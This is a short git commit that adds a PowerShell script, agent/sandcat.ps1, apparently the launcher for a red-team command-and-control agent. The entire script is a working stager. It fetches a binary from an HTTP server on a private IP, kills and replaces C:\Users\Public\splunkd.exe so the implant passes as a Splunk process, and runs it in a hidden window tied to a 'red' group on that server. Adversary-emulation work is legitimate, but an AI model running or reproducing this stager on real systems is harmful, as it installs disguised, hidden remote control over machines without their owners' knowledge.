e7cda626a154fcc7ccea185a0d35330b31caa150
uenouan <uenotakabon@gmail.com>
2025-05-20 17:24:25 +0900

    updated

---
+++ agent/sandcat.ps1
@@ -0,0 +1,10 @@
+$server="http://172.18.25.10:8888";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
+rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
+[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
